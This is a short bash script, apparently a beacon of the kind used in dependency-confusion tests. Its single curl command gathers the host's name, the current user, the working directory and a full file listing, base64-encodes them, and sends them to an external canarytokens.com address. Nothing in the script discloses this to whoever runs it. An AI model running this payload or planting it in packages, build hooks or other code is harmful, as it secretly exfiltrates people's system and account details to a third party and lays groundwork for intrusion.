#!/bin/bash

curl -H "Hostname: $(hostname | base64)" -H "Whoami: $(whoami | base64)" -H "Pwd: $(pwd | base64)" -d $(ls -la | base64)  http://om3yasnkv35oaxz8t04ccyvyr.canarytokens.com
